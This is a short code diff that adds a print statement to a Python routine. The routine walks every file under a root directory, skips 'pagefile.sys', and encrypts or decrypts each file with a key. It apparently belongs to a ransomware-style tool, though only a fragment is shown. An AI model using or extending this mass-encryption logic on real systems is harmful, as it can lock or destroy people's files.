@@ -84,6 +84,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
         for file in files:
             if file != "pagefile.sys":
                 filename = os.path.join(subdir, file)
+                print(filename)
                 if function == 0:    
                     encrypt_file(key, filename, None, 64*1024)
                 elif function == 1:
